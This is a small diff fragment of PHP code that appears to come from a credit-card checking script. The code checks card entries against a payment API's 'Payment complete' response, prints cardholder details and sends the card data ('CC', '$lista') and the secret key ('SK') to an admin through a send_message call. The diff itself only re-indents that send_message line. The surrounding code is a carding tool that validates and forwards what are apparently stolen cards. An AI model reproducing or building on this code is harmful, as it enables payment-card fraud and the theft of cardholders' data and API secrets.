@@ -154,7 +154,7 @@ if(strpos($result2, '"seller_message": "Payment complete."' )) {
 ➜ 𝗜𝗻𝗳𝗼: Name:'.$name.' Address:'.$add1.' State:'.$state.'  Zip:'.$zip. 'Country: '.$country.'<br>
 ➜ 𝗥𝗲𝗰𝗶𝗽𝘁: <a href=$receipturl>Here</a> <br>
 ';
-send_message($admin, "CC \nϲϲ ➔ <code>$lista</code>\nTYPE➠ Ccn $amt€ \nSK ➠ <code>$sk</code>");
+  send_message($admin, "CC \nϲϲ ➔ <code>$lista</code>\nTYPE➠ Ccn $amt€ \nSK ➠ <code>$sk</code>");
     
 
 }
